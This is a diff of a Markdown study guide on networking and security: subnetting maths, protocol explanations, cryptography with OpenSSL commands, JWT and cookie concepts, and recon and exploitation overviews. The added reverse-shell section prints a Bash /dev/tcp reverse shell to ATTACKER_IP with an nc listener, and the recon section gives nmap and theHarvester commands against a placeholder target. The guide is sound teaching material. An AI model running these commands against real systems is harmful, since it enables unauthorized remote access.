@@ -143,12 +143,14 @@ A 128-bit address written in 8 groups of hexadecimal digits separated by colons 
 Leading zeros in a group can be omitted, and one sequence of consecutive all-zero groups can be replaced with `::` (only once per address).
 
 ### IPv4 vs IPv6
-| IPv4 | IPv6 |
-|---|---|
-| 32-bit | 128-bit |
-| Dotted decimal | Hexadecimal colon notation |
-| NAT commonly required | NAT generally unnecessary |
-| No native IPsec | IPsec built-in |
+
+| IPv4                                 | IPv6                                   |
+| ------------------------------------ | -------------------------------------- |
+| 32-bit                               | 128-bit                                |
+| 8 (bits per octet) × 4 (octets) = 32 | 16 (bits per group) × 8 (groups) = 128 |
+| Dotted decimal notation              | Hexadecimal colon notation             |
+| NAT commonly required                | NAT generally unnecessary              |
+| No native IPsec                      | IPsec built-in                         |
 
 ---
 
@@ -157,28 +159,166 @@ Leading zeros in a group can be omitted, and one sequence of consecutive all-zer
 Subnetting divides a large network into smaller, more manageable sub-networks (subnets) by borrowing bits from the host portion of an IP address.
 
 #### Why Subnet
-- Reduces broadcast traffic
-- Improves security through segmentation
-- Efficient IP address utilization
-- Easier network management
+
+* Reduces broadcast traffic
+* Improves security through segmentation
+* Efficient IP address utilization
+* Easier network management
 
 #### Key Concepts
-- **Subnet Mask**: Defines which bits represent the network vs the host (e.g., 255.255.255.0 = /24).
-- **CIDR Notation**: Shorthand like /24, /26, indicating the number of network bits.
-- **Binary Subnetting**: Converting the subnet mask and IP to binary to calculate network address, broadcast address, and valid host range.
+
+* **Subnet Mask**: Defines which bits represent the network vs the host (e.g., `255.255.255.0 = /24`).
+* **CIDR Notation**: Shorthand like `/24`, `/26`, indicating the number of network bits.
+* **Binary Subnetting**: Converting the subnet mask and IP to binary to calculate network address, broadcast address, and valid host range.
+
+#### CIDR Maths
+
+For IPv4:
+
+* Total bits = **32**
+* Network bits = **CIDR prefix**
+* Host bits = **32 - CIDR prefix**
+
+| Calculation           | Formula                     | Example `/26`                |
+| --------------------- | --------------------------- | ---------------------------- |
+| Network bits          | CIDR prefix                 | `26`                         |
+| Host bits             | `32 - prefix`               | `32 - 26 = 6`                |
+| Total IP addresses    | `2^(host bits)`             | `2^6 = 64`                   |
+| Usable host addresses | `2^(host bits) - 2`         | `64 - 2 = 62`                |
+| Network address       | First IP in subnet          | `192.168.1.0`                |
+| Broadcast address     | Last IP in subnet           | `192.168.1.63`               |
+| Usable host range     | Network + 1 → Broadcast - 1 | `192.168.1.1 - 192.168.1.62` |
+
+> **Note:** The `-2` accounts for the **network address** and **broadcast address**. This traditional calculation applies to normal IPv4 subnets such as `/24` through `/30`. `/31` and `/32` have special uses.
+
+#### CIDR Quick Reference
+
+| CIDR  | Host Bits |       Total IPs |    Usable Hosts |
+| ----- | --------: | --------------: | --------------: |
+| `/16` |        16 | `2^16 = 65,536` |        `65,534` |
+| `/17` |        15 | `2^15 = 32,768` |        `32,766` |
+| `/18` |        14 | `2^14 = 16,384` |        `16,382` |
+| `/19` |        13 |  `2^13 = 8,192` |         `8,190` |
+| `/20` |        12 |  `2^12 = 4,096` |         `4,094` |
+| `/21` |        11 |  `2^11 = 2,048` |         `2,046` |
+| `/22` |        10 |  `2^10 = 1,024` |         `1,022` |
+| `/23` |         9 |     `2^9 = 512` |           `510` |
+| `/24` |         8 |     `2^8 = 256` |           `254` |
+| `/25` |         7 |     `2^7 = 128` |           `126` |
+| `/26` |         6 |      `2^6 = 64` |            `62` |
+| `/27` |         5 |      `2^5 = 32` |            `30` |
+| `/28` |         4 |      `2^4 = 16` |            `14` |
+| `/29` |         3 |       `2^3 = 8` |             `6` |
+| `/30` |         2 |       `2^2 = 4` |             `2` |
+| `/31` |         1 |       `2^1 = 2` | Point-to-point* |
+| `/32` |         0 |       `2^0 = 1` | Single address* |
+
+* `/31` is commonly used for point-to-point links, where both addresses can be used. `/32` represents a single IPv4 address.
 
 #### Example
-Given 192.168.1.0/26 (mask 255.255.255.192):
-- Increment = 256 - 192 = 64
-- Subnets: 192.168.1.0, .64, .128, .192
-- For 192.168.1.0/26: Network = .0, Broadcast = .63, Usable hosts = .1 to .62 (62 hosts)
+
+Given `192.168.1.0/26`:
+
+**Step 1 — Find host bits**
+
+```text
+Host bits = 32 - 26
+          = 6
+```
+
+**Step 2 — Calculate total IP addresses**
+
+```text
+Total IPs = 2^6
+          = 64
+```
+
+**Step 3 — Calculate usable hosts**
+
+```text
+Usable hosts = 2^6 - 2
+             = 64 - 2
+             = 62
+```
+
+**Step 4 — Calculate subnet increment**
+
+The subnet mask for `/26` is `255.255.255.192`.
+
+```text
+Increment = 256 - 192
+          = 64
+```
+
+Therefore, the subnets are:
+
+```text
+192.168.1.0/26
+192.168.1.64/26
+192.168.1.128/26
+192.168.1.192/26
+```
+
+For `192.168.1.0/26`:
+
+```text
+Network   = 192.168.1.0
+First host = 192.168.1.1
+Last host  = 192.168.1.62
+Broadcast = 192.168.1.63
+```
 
 #### Formulae
-- Number of subnets = 2^(borrowed bits)
-- Number of usable hosts per subnet = 2^(host bits) - 2
+
+| Requirement        | Formula                        |
+| ------------------ | ------------------------------ |
+| IPv4 total bits    | `32`                           |
+| Host bits          | `32 - CIDR prefix`             |
+| Network bits       | `CIDR prefix`                  |
+| Total IP addresses | `2^(host bits)`                |
+| Usable IPv4 hosts  | `2^(host bits) - 2`            |
+| Subnet increment   | `256 - subnet mask value`      |
+| Number of subnets  | `2^(borrowed bits)`            |
+| Borrowed bits      | `New prefix - Original prefix` |
+
+#### Number of Subnets Example
+
+Given a `/24` network split into `/26`:
+
+```text
+Borrowed bits = 26 - 24
+              = 2
+```
+
+```text
+Number of subnets = 2^2
+                  = 4
+```
+
+Each `/26` subnet contains:
+
+```text
+Host bits = 32 - 26
+          = 6
+
+Total IPs = 2^6
+          = 64
+
+Usable hosts = 64 - 2
+             = 62
+```
+
+So:
+
+| Original Network | New CIDR | Borrowed Bits | Number of Subnets | IPs per Subnet | Usable Hosts |
+| ---------------- | -------: | ------------: | ----------------: | -------------: | -----------: |
+| `/24`            |    `/26` |           `2` |         `2^2 = 4` |     `2^6 = 64` |         `62` |
 
 #### VLSM (Variable Length Subnet Masking)
+
 Allows subnets of different sizes within the same network, optimizing address allocation instead of using one fixed mask everywhere.
+
+For example, a `/24` network can be divided into `/26`, `/27`, and `/28` subnets depending on the number of hosts required.
 
 ---
 
@@ -212,45 +352,505 @@ A form of dynamic NAT that maps multiple private IP addresses to a single public
 
 ---
 
-# TCP, UDP, and Other Protocols
+# Protocols
+
+A **network protocol** is a set of rules that defines how devices communicate and exchange data over a network. Protocols specify things such as **how data is formatted, addressed, transmitted, received, acknowledged, and secured**.
+
+Different protocols operate at different layers of the networking stack and serve different purposes. For example, **TCP** provides reliable data delivery, **DNS** resolves domain names to IP addresses, **HTTP/HTTPS** transfers web content, and **ARP** maps IP addresses to MAC addresses on a local network.
 
 #### TCP (Transmission Control Protocol)
-Connection-oriented, reliable protocol that guarantees ordered delivery through acknowledgments, retransmissions, and flow control.
+
+TCP is a **connection-oriented and reliable transport-layer protocol**. It establishes a connection between two devices before transmitting application data and ensures that data arrives **reliably, in order, and without duplication**.
+
+TCP achieves reliability using:
+
+* **Sequence numbers** — identify the position of data in the byte stream.
+* **Acknowledgments (ACKs)** — confirm that data was received.
+* **Retransmission** — resends data if it is lost.
+* **Checksum** — detects corrupted data.
+* **Flow control** — prevents a sender from overwhelming the receiver.
+* **Congestion control** — adjusts transmission speed based on network conditions.
 
 **Three-Way Handshake:**
-1. SYN - client requests connection
-2. SYN-ACK - server acknowledges and responds
-3. ACK - client confirms, connection established
 
-**Four-Way Termination:** FIN, ACK, FIN, ACK
+1. **SYN** — client requests a connection.
+2. **SYN-ACK** — server acknowledges the request and responds.
+3. **ACK** — client confirms; the connection is established.
 
-Used for: HTTP/HTTPS, FTP, SMTP, SSH - anywhere reliability matters.
+**Four-Way Termination:**
+
+1. **FIN** — one side requests to close its connection.
+2. **ACK** — other side acknowledges.
+3. **FIN** — other side closes its connection.
+4. **ACK** — final acknowledgment.
+
+**Common uses:**
+
+* HTTP/HTTPS
+* SSH
+* FTP
+* SMTP
+* IMAP
+
+TCP is preferred when **reliable and ordered delivery** is more important than minimum latency.
 
 #### UDP (User Datagram Protocol)
-Connectionless, "fire and forget" protocol with no guarantee of delivery or order, but low overhead and low latency.
 
-Used for: DNS, DHCP, video streaming, VoIP, online gaming.
+UDP is a **connectionless transport-layer protocol**. Unlike TCP, it does not establish a connection or guarantee that packets will arrive.
 
-### TCP vs UDP
-| TCP | UDP |
-|---|---|
-| Connection-oriented | Connectionless |
-| Reliable, ordered | Unreliable, unordered |
-| Higher overhead | Lower overhead |
-| Slower | Faster |
+UDP provides:
 
-#### Other Common Protocols
-- **HTTP/HTTPS**: Web traffic (port 80/443); HTTPS adds TLS encryption.
-- **DNS**: Resolves domain names to IP addresses (port 53).
-- **DHCP**: Dynamically assigns IP addresses to devices (ports 67/68).
-- **FTP/SFTP**: File transfer (port 21/22).
-- **SSH**: Secure remote login and command execution (port 22).
-- **Telnet**: Unencrypted remote login (port 23) - insecure, largely deprecated.
-- **SMTP/POP3/IMAP**: Email sending and retrieval (ports 25, 110, 143).
-- **ICMP**: Used for diagnostics like ping and traceroute; not a transport protocol.
-- **ARP**: Resolves IP addresses to MAC addresses on a local network.
-- **SNMP**: Network device monitoring and management (port 161).
-- **NTP**: Time synchronization across devices (port 123).
+* No connection establishment
+* No delivery guarantee
+* No ordering guarantee
+* No retransmission
+* Low protocol overhead
+* Low latency
+
+The application sends **datagrams** without waiting for acknowledgments from the receiver.
+
+Because UDP does not spend time establishing connections, acknowledging packets, or retransmitting lost data, it is useful for applications where **speed and low latency are more important than perfect delivery**.
+
+**Common uses:**
+
+* DNS
+* DHCP
+* VoIP
+* Live video/audio streaming
+* Online gaming
+
+For example, losing one video frame during a live stream may be preferable to waiting for retransmission and causing additional delay.
+
+#### TCP vs UDP
+
+| TCP                           | UDP                                 |
+| ----------------------------- | ----------------------------------- |
+| Connection-oriented           | Connectionless                      |
+| Reliable delivery             | No delivery guarantee               |
+| Ordered delivery              | No ordering guarantee               |
+| Uses acknowledgments          | No acknowledgments                  |
+| Retransmits lost data         | Does not retransmit                 |
+| Higher overhead               | Lower overhead                      |
+| Generally higher latency      | Generally lower latency             |
+| Flow and congestion control   | No built-in flow/congestion control |
+| Best when reliability matters | Best when speed/latency matters     |
+
+#### HTTP (Hypertext Transfer Protocol)
+
+HTTP is an **application-layer protocol** used to transfer web resources between clients and servers.
+
+A typical HTTP communication works like this:
+
+```text
+Client → HTTP Request → Web Server
+Client ← HTTP Response ← Web Server
+```
+
+An HTTP request can contain:
+
+* **Method** — such as `GET`, `POST`, `PUT`, or `DELETE`.
+* **URL/path** — identifies the requested resource.
+* **Headers** — provide additional information.
+* **Body** — carries data when required.
+
+The server responds with:
+
+* **Status code** — such as `200`, `404`, or `500`.
+* **Headers**
+* **Response body**
+
+**Common port:** `80`
+
+HTTP itself does not provide encryption. For secure web communication, **HTTPS** is used.
+
+**Common uses:**
+
+* Websites
+* Web APIs
+* REST APIs
+* Communication between web browsers and servers
+
+#### HTTPS (HTTP Secure)
+
+HTTPS is HTTP transmitted over **TLS (Transport Layer Security)**.
+
+It provides:
+
+* **Encryption** — protects data from being read in transit.
+* **Authentication** — helps verify that the client is communicating with the intended server.
+* **Integrity** — helps detect tampering with transmitted data.
+
+**Common port:** `443`
+
+A simplified connection looks like:
+
+```text
+Client
+  ↓
+TLS handshake
+  ↓
+Encrypted HTTP communication
+  ↓
+Web Server
+```
+
+HTTPS is used for websites, APIs, login pages, online banking, e-commerce, and other applications where data should be protected.
+
+#### DNS (Domain Name System)
+
+DNS translates **domain names into IP addresses** so that clients can locate servers.
+
+For example:
+
+```text
+www.example.com
+       ↓
+DNS lookup
+       ↓
+93.184.216.34
+```
+
+Without DNS, users would generally need to remember IP addresses instead of domain names.
+
+DNS commonly uses:
+
+* **UDP port 53** for normal queries.
+* **TCP port 53** for cases such as larger responses and DNS zone transfers.
+
+Common DNS record types include:
+
+| Record  | Purpose                                                       |
+| ------- | ------------------------------------------------------------- |
+| `A`     | Maps a domain to an IPv4 address                              |
+| `AAAA`  | Maps a domain to an IPv6 address                              |
+| `CNAME` | Alias for another domain name                                 |
+| `MX`    | Specifies mail servers                                        |
+| `NS`    | Specifies authoritative name servers                          |
+| `TXT`   | Stores text information, often used for verification/security |
+
+**Example:**
+
+```text
+example.com
+     ↓
+DNS Resolver
+     ↓
+DNS Server
+     ↓
+192.0.2.10
+```
+
+#### DHCP (Dynamic Host Configuration Protocol)
+
+DHCP automatically provides network configuration to devices when they join a network.
+
+A DHCP server can provide:
+
+* IP address
+* Subnet mask
+* Default gateway
+* DNS server
+* Lease duration
+
+The typical DHCP process is called **DORA**:
+
+1. **Discover** — client broadcasts a request for a DHCP server.
+2. **Offer** — DHCP server offers an IP configuration.
+3. **Request** — client requests the offered configuration.
+4. **ACK** — server confirms the assignment.
+
+**Ports:**
+
+* DHCP server: `UDP 67`
+* DHCP client: `UDP 68`
+
+Without DHCP, devices would need to be manually configured with network settings.
+
+#### FTP (File Transfer Protocol)
+
+FTP is an application-layer protocol used to **transfer files between a client and a server**.
+
+FTP supports operations such as:
+
+* Uploading files
+* Downloading files
+* Listing directories
+* Creating directories
+* Renaming files
+* Deleting files
+
+**Control connection:** `TCP 21`
+
+Traditional FTP does **not encrypt credentials or file contents**, making it unsuitable for sensitive communication over untrusted networks.
+
+#### SFTP (SSH File Transfer Protocol)
+
+SFTP provides secure file transfer through **SSH**.
+
+It encrypts:
+
+* Authentication credentials
+* Commands
+* File contents
+* Directory information
+
+**Common port:** `TCP 22`
+
+SFTP should not be confused with **FTPS**, which is FTP secured using TLS. SFTP is a separate protocol that operates through SSH.
+
+#### SSH (Secure Shell)
+
+SSH is a secure protocol used for **remote login, command execution, and secure file transfer**.
+
+It encrypts communication between the client and server.
+
+**Common port:** `TCP 22`
+
+Common SSH uses include:
+
+* Remote server administration
+* Running commands remotely
+* Secure file transfer
+* Port forwarding/tunneling
+* Git operations over SSH
+
+Example:
+
+```text
+Administrator
+     ↓
+   SSH
+     ↓
+Remote Server
+     ↓
+Execute commands securely
+```
+
+SSH can authenticate users using passwords or, preferably in many administrative environments, **public-key authentication**.
+
+#### Telnet
+
+Telnet is an older protocol for **remote command-line access**.
+
+**Common port:** `TCP 23`
+
+Unlike SSH, Telnet does **not encrypt the communication**. Usernames, passwords, commands, and other transmitted data can potentially be observed by an attacker who can capture the traffic.
+
+Therefore:
+
+```text
+Telnet → Unencrypted → Insecure
+SSH    → Encrypted   → Secure alternative
+```
+
+Telnet is largely deprecated for remote administration and is generally replaced by SSH.
+
+#### SMTP (Simple Mail Transfer Protocol)
+
+SMTP is used primarily for **sending and relaying email**.
+
+A simplified email flow is:
+
+```text
+Email Client
+     ↓
+SMTP Server
+     ↓
+Sender Mail Server
+     ↓
+Recipient Mail Server
+```
+
+Common SMTP ports include:
+
+|  Port | Common use                                    |
+| ----: | --------------------------------------------- |
+|  `25` | Server-to-server mail transfer                |
+| `587` | Mail submission, commonly with authentication |
+| `465` | SMTP over implicit TLS in common deployments  |
+
+SMTP is primarily a **mail sending/transfer protocol**. It does not normally provide the mechanism used by an email client to retrieve messages from a mailbox.
+
+#### POP3 (Post Office Protocol version 3)
+
+POP3 is an email retrieval protocol used by clients to **download messages from a mail server**.
+
+**Common ports:**
+
+* `110` — POP3
+* `995` — POP3 over TLS
+
+POP3 traditionally focuses on downloading messages to the client and can be configured to remove messages from the server after download.
+
+It is useful for simpler email access but provides less flexible synchronization than IMAP.
+
+#### IMAP (Internet Message Access Protocol)
+
+IMAP is an email retrieval and synchronization protocol.
+
+Unlike traditional POP3 usage, IMAP keeps messages on the server and allows clients to synchronize:
+
+* Emails
+* Folders
+* Read/unread status
+* Flags
+* Message state
+
+**Common ports:**
+
+* `143` — IMAP
+* `993` — IMAP over TLS
+
+IMAP is generally better suited to users who access the same mailbox from **multiple devices**.
+
+#### ICMP (Internet Control Message Protocol)
+
+ICMP is a network-layer control and diagnostic protocol used by IP networks.
+
+It is **not a transport protocol like TCP or UDP**.
+
+ICMP is commonly used for:
+
+* Error reporting
+* Network diagnostics
+* Reachability testing
+* Path troubleshooting
+
+**Ping** uses ICMP Echo Request and Echo Reply messages.
+
+```text
+Host A
+  │
+  │ ICMP Echo Request
+  ↓
+Host B
+  │
+  │ ICMP Echo Reply
+  ↓
+Host A
+```
+
+Tools such as `ping` use ICMP to determine whether a destination is reachable and measure round-trip time.
+
+`traceroute`/`tracert` can also use ICMP messages, depending on the operating system and implementation.
+
+#### ARP (Address Resolution Protocol)
+
+ARP is used on IPv4 local networks to determine the **MAC address associated with an IPv4 address**.
+
+For example:
+
+```text
+IPv4 address: 192.168.1.20
+        ↓
+      ARP
+        ↓
+MAC address: AA:BB:CC:DD:EE:FF
+```
+
+A device can send an ARP request asking:
+
+```text
+Who has 192.168.1.20?
+```
+
+The device owning that IP address responds with its MAC address.
+
+ARP operates within the **local Layer 2 network/broadcast domain**.
+
+> IPv6 does not use ARP. IPv6 uses **Neighbor Discovery Protocol (NDP)** instead.
+
+#### SNMP (Simple Network Management Protocol)
+
+SNMP is used to **monitor and manage network devices** such as:
+
+* Routers
+* Switches
+* Firewalls
+* Servers
+* Printers
+* Access points
+
+SNMP can provide information such as:
+
+* CPU utilization
+* Memory usage
+* Interface status
+* Interface traffic
+* Device uptime
+* Error counters
+
+**Common ports:**
+
+* `UDP 161` — SNMP queries/operations
+* `UDP 162` — SNMP traps/notifications
+
+A monitoring system can periodically query devices:
+
+```text
+Network Monitoring Server
+          ↓
+       SNMP Query
+          ↓
+Router / Switch
+          ↓
+     SNMP Response
+          ↓
+Network Monitoring Server
+```
+
+SNMP versions differ in security capabilities. **SNMPv3** provides significantly stronger security features than older versions.
+
+#### NTP (Network Time Protocol)
+
+NTP synchronizes the clocks of networked devices.
+
+**Common port:** `UDP 123`
+
+Accurate time is important for:
+
+* Log correlation
+* Security investigations
+* Authentication systems
+* Certificates
+* Distributed applications
+* Scheduled tasks
+
+A simplified NTP hierarchy is:
+
+```text
+Reference Time Source
+        ↓
+   NTP Server
+        ↓
+ Routers / Servers
+        ↓
+ Client Devices
+```
+
+NTP allows devices to maintain clocks that are closely synchronized with a common time source.
+
+#### Protocol Summary
+
+| Protocol | Purpose                         |     Common Port |
+| -------- | ------------------------------- | --------------: |
+| TCP      | Reliable transport              |         Various |
+| UDP      | Fast connectionless transport   |         Various |
+| HTTP     | Web communication               |          TCP 80 |
+| HTTPS    | Secure web communication        |         TCP 443 |
+| DNS      | Domain name resolution          |      UDP/TCP 53 |
+| DHCP     | Automatic IP configuration      |       UDP 67/68 |
+| FTP      | File transfer                   |          TCP 21 |
+| SFTP     | Secure file transfer over SSH   |          TCP 22 |
+| SSH      | Secure remote access            |          TCP 22 |
+| Telnet   | Unencrypted remote access       |          TCP 23 |
+| SMTP     | Sending/relaying email          |  TCP 25/465/587 |
+| POP3     | Email retrieval                 |     TCP 110/995 |
+| IMAP     | Email retrieval/synchronization |     TCP 143/993 |
+| ICMP     | Diagnostics and network control | No TCP/UDP port |
+| ARP      | IPv4-to-MAC resolution          | No TCP/UDP port |
+| SNMP     | Network monitoring/management   |     UDP 161/162 |
+| NTP      | Time synchronization            |         UDP 123 |
 
 ---
 
@@ -440,6 +1040,157 @@ A security model based on "never trust, always verify" - no user or device is tr
 
 ---
 
+# JWT (JSON Web Token)
+
+A compact, self-contained token format used for authentication and information exchange, structured in three Base64URL-encoded parts separated by dots: `Header.Payload.Signature`.
+
+#### Structure
+- **Header**: Specifies the token type and signing algorithm (e.g., HS256, RS256).
+- **Payload**: Contains claims (user data, expiry, issuer, etc.). Not encrypted, only encoded — never store secrets here.
+- **Signature**: Verifies the token hasn't been tampered with, created by signing the header+payload with a secret (HMAC) or private key (RSA/ECDSA).
+
+#### How It Works
+1. User authenticates; server issues a signed JWT.
+2. Client stores the JWT (e.g., in memory, localStorage, or a cookie) and sends it with each request (commonly `Authorization: Bearer <token>`).
+3. Server verifies the signature and claims on each request — no server-side session lookup needed.
+
+#### JWT vs Session Tokens
+| JWT | Session Token |
+|---|---|
+| Stateless, self-contained | Stateful, server stores session data |
+| Server doesn't need to store token | Requires session store (DB/Redis) |
+| Harder to revoke before expiry | Easy to revoke (delete session) |
+| Scales well across servers | Needs shared session store to scale |
+
+#### Common Vulnerabilities
+- **alg:none attack**: Attacker sets algorithm to "none" and strips the signature; poorly implemented verifiers accept it.
+- **Algorithm confusion**: Tricking an RS256 verifier into treating the public key as an HMAC secret.
+- **Weak secret**: Brute-forcing a short/guessable HMAC signing secret.
+- **No expiry validation**: Tokens accepted indefinitely if `exp` isn't checked.
+- **Sensitive data in payload**: Payload is only encoded, not encrypted — readable by anyone with the token.
+
+---
+
+# Cookies and Sessions
+
+#### Cookies
+Small key-value pairs stored by the browser and sent automatically with requests to the issuing domain.
+
+Key attributes:
+- **Secure**: Only sent over HTTPS.
+- **HttpOnly**: Inaccessible to JavaScript, mitigates XSS-based theft.
+- **SameSite**: Controls cross-site sending (`Strict`, `Lax`, `None`) — mitigates CSRF.
+- **Domain/Path**: Scopes which requests include the cookie.
+- **Expires/Max-Age**: Controls cookie lifetime.
+
+#### Sessions
+Server-side state tied to a client via a session ID stored in a cookie.
+
+```text
+Login → Server creates session (stored server-side) → Session ID sent as cookie
+     → Client sends cookie on each request → Server looks up session
+```
+
+#### Cookie/Session-Based Auth vs Token-Based (JWT) Auth
+| Cookie/Session | JWT |
+|---|---|
+| Server stores session state | Stateless, self-contained |
+| Revocation is immediate | Revocation requires extra mechanism (blocklist, short expiry) |
+| Vulnerable to CSRF (mitigate with SameSite/CSRF tokens) | Not inherently CSRF-vulnerable if not stored in cookies |
+| Vulnerable to session hijacking if ID leaked | Vulnerable to token theft if leaked (e.g., via XSS) |
+
+---
+
+# Reconnaissance
+
+The information-gathering phase of an attack (or a pentest), typically split into passive and active recon.
+
+#### Passive Recon
+Gathering information without directly interacting with the target's systems.
+- OSINT (WHOIS lookups, DNS records, social media, job postings, GitHub leaks)
+- Search engine dorking (Google dorks)
+- Certificate transparency logs (crt.sh) for subdomain discovery
+
+#### Active Recon
+Directly interacting with the target's infrastructure — noisier, more detectable.
+- Port scanning (`nmap`)
+- Service/version detection and OS fingerprinting
+- DNS zone transfers, subdomain brute-forcing
+- Banner grabbing
+
+**Common tools:**
+```bash
+nmap -sV -sC -p- target.com        # full port scan with version/script detection
+whois target.com
+dig target.com ANY
+theharvester -d target.com -b all
+```
+
+#### Enumeration
+Follows recon; actively extracting detailed information from discovered services (users, shares, running software versions) to identify attack surface.
+
+---
+
+# Exploitation
+
+The phase where an attacker leverages a discovered vulnerability to gain unauthorized access or execute code.
+
+#### Exploit Types
+- **Remote Code Execution (RCE)**: Executing arbitrary code on a target system remotely.
+- **Local Privilege Escalation (LPE)**: Elevating privileges after initial access is gained.
+- **Public exploits**: Pre-written exploit code (Metasploit modules, Exploit-DB) for known CVEs.
+- **Custom/0-day exploits**: Exploits for vulnerabilities with no public patch or disclosure.
+
+#### Typical Exploitation Workflow
+```text
+Recon → Identify vulnerable service/version
+     → Find/develop exploit
+     → Gain initial access (shell, RCE)
+     → Post-exploitation (privilege escalation, persistence, lateral movement)
+```
+
+#### Common Frameworks/Tools
+- **Metasploit**: Framework with modules for exploits, payloads, and post-exploitation.
+- **Burp Suite**: Web application testing (interception, fuzzing, manual exploitation).
+- **searchsploit**: CLI search against Exploit-DB.
+
+---
+
+# Reverse Shells and Bind Shells
+
+#### Bind Shell
+The target machine opens a listening port and waits for the attacker to connect. Requires the target's port to be reachable — often blocked by firewalls/NAT on the target side.
+
+#### Reverse Shell
+The target machine initiates the connection back to the attacker's listener. Preferred in practice because outbound connections are commonly less restricted than inbound ones.
+
+```text
+Attacker (listener)  ←──── connects ────  Target (victim)
+```
+
+**Attacker sets up a listener:**
+```bash
+nc -lvnp 4444
+```
+
+**Target connects back (example, Linux Bash):**
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+**Common reverse shell payloads:** Netcat, Bash, Python, PHP, PowerShell (Windows) — the mechanism differs, the principle is the same: victim connects out to attacker.
+
+#### Shell Stabilization
+Raw reverse shells are often unstable (no job control, no tab-completion). Common upgrade technique:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+followed by setting terminal size and enabling raw mode for a fully interactive TTY.
+
+> **Note:** Reverse/bind shell techniques are standard penetration-testing and CTF knowledge — only use them against systems you own or are explicitly authorized to test.
+
+---
+
 # Network Security Devices
 
 #### Firewall
@@ -516,37 +1267,683 @@ A security risk originating from someone within the organization (employee, cont
 
 # Cryptography
 
+**Cryptography** is the practice of protecting information using mathematical techniques. It is used to provide **confidentiality, integrity, authentication, and non-repudiation**.
+
+The main cryptographic concepts used in networking and Linux security are:
+
+* Symmetric encryption
+* Asymmetric encryption
+* Hashing
+* Digital signatures
+* PKI
+* Digital certificates
+* SSL/TLS
+* Salting
+
 #### Symmetric Encryption
-Uses a single shared key for both encryption and decryption. Fast, efficient for large data, but key distribution is a challenge. Examples: AES, DES, 3DES.
+
+Symmetric encryption uses **the same secret key** to encrypt and decrypt data.
+
+```text
+Plaintext
+   ↓
+[ Encryption + Secret Key ]
+   ↓
+Ciphertext
+   ↓
+[ Decryption + Same Secret Key ]
+   ↓
+Plaintext
+```
+
+The main advantage is **speed**. Symmetric algorithms are much faster than asymmetric algorithms and are therefore commonly used to encrypt large amounts of data.
+
+The main challenge is **key distribution**: both parties need to securely obtain the same secret key.
+
+**Examples:**
+
+| Algorithm | Description                                       |
+| --------- | ------------------------------------------------- |
+| AES       | Modern, secure, widely used symmetric cipher      |
+| DES       | Old 56-bit cipher; considered insecure            |
+| 3DES      | Applies DES multiple times; legacy and deprecated |
+
+##### AES (Advanced Encryption Standard)
+
+AES is one of the most widely used symmetric encryption algorithms.
+
+Common key sizes are:
+
+* AES-128
+* AES-192
+* AES-256
+
+The number represents the **key size in bits**, not the block size. AES always uses a **128-bit block size**.
+
+AES is commonly used for:
+
+* Disk encryption
+* VPNs
+* TLS
+* File encryption
+* Database encryption
+* Application-level encryption
+
+**Linux command:**
+
+```bash
+openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.txt -out secret.txt.enc
+```
+
+This command:
+
+* `openssl` → invokes OpenSSL.
+* `enc` → uses OpenSSL's symmetric encryption interface.
+* `-aes-256-cbc` → uses AES-256 in CBC mode.
+* `-salt` → adds a random salt when deriving the encryption key from a password.
+* `-pbkdf2` → derives the encryption key using PBKDF2.
+* `-in secret.txt` → input file.
+* `-out secret.txt.enc` → encrypted output file.
+
+OpenSSL asks for a password and derives the encryption key from it.
+
+To decrypt:
+
+```bash
+openssl enc -d -aes-256-cbc -pbkdf2 -in secret.txt.enc -out secret.txt
+```
+
+`-d` means **decrypt**.
+
+> AES-CBC provides confidentiality but does not by itself provide authentication/integrity. Modern applications commonly prefer authenticated encryption modes such as AES-GCM.
+
+##### DES
+
+DES is an old symmetric encryption algorithm using an effective **56-bit key**.
+
+Because modern computers can brute-force its key space, DES is considered **insecure** and should not be used for new systems.
+
+```text
+DES → Legacy → Insecure
+AES → Modern → Preferred
+```
+
+**Linux/OpenSSL example:**
+
+```bash
+openssl enc -des-cbc -in secret.txt -out secret.des
+```
+
+This is useful mainly for understanding legacy systems, not for protecting new data.
+
+##### 3DES (Triple DES)
+
+3DES applies the DES operation multiple times to increase security compared with original DES.
+
+It was historically used in:
+
+* Banking systems
+* Payment systems
+* Legacy applications
+* Older network protocols
+
+However, 3DES is now considered **legacy/deprecated** and should generally be replaced with AES.
 
 #### Asymmetric Encryption
-Uses a mathematically linked key pair - a public key (shared openly) and a private key (kept secret). Solves the key distribution problem but is slower. Examples: RSA, ECC, Diffie-Hellman.
+
+Asymmetric cryptography uses a **pair of mathematically related keys**:
+
+* **Public key** → can be shared with others.
+* **Private key** → must remain secret.
+
+```text
+              Key Pair
+             /        \
+       Public Key    Private Key
+          ↓              ↓
+      Share openly    Keep secret
+```
+
+Unlike symmetric encryption, the same key is not used for both operations.
+
+Asymmetric cryptography is commonly used for:
+
+* Secure key exchange
+* Authentication
+* Digital signatures
+* Certificates
+* SSH
+* TLS
+
+It is computationally more expensive than symmetric encryption, so systems commonly use asymmetric cryptography to establish trust or exchange keys and then use symmetric encryption for the actual data transfer.
+
+#### RSA (Rivest-Shamir-Adleman)
+
+RSA is a widely known asymmetric cryptographic algorithm based on the mathematical difficulty of factoring large numbers.
+
+RSA uses:
+
+* Public key
+* Private key
+
+It can be used for:
+
+* Encryption
+* Digital signatures
+* Authentication
+* Key transport
+
+Modern RSA keys commonly use sizes such as **2048 or 3072 bits**.
+
+**Generate an RSA private key:**
+
+```bash
+openssl genrsa -out private.key 2048
+```
+
+This creates a 2048-bit RSA private key.
+
+**Extract the public key:**
+
+```bash
+openssl rsa -in private.key -pubout -out public.key
+```
+
+The resulting files are:
+
+```text
+private.key → Keep secret
+public.key  → Can be shared
+```
+
+**Important:** RSA is generally not used to encrypt large files directly. Symmetric encryption is much more efficient for bulk data.
+
+#### ECC (Elliptic Curve Cryptography)
+
+ECC uses mathematical properties of **elliptic curves** to provide asymmetric cryptography.
+
+Its major advantage is that it can provide strong security with **smaller keys** compared with RSA.
+
+ECC is commonly used in:
+
+* TLS
+* SSH
+* Digital signatures
+* Mobile devices
+* Modern authentication systems
+
+Common elliptic-curve algorithms include:
+
+* ECDSA → digital signatures
+* ECDH → key agreement
+
+**Generate an EC private key:**
+
+```bash
+openssl ecparam -name prime256v1 -genkey -noout -out ec-private.key
+```
+
+Extract the public key:
+
+```bash
+openssl ec -in ec-private.key -pubout -out ec-public.key
+```
+
